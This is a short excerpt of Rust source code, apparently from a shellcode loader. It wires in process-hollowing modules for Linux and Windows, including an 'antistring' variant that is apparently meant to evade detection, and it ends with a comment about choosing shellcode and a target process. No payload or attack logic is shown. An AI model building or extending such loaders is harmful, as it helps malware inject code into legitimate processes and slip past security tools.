...
#[cfg(target_os = "linux")]
mod process_hollowing_linux;
#[cfg(target_os = "linux")]
use process_hollowing_linux::hollow_and_run;
...
mod process_hollowing_windows;
#[cfg(all(windows, not(feature = "antistring")))]
use process_hollowing_windows::hollow_and_run;
#[cfg(all(windows, feature = "antistring"))]
mod process_hollowing_windows_antistring;
#[cfg(all(windows, feature = "antistring"))]
use process_hollowing_windows_antistring::hollow_and_run;
// Determine which shellcode and target process to use based on features
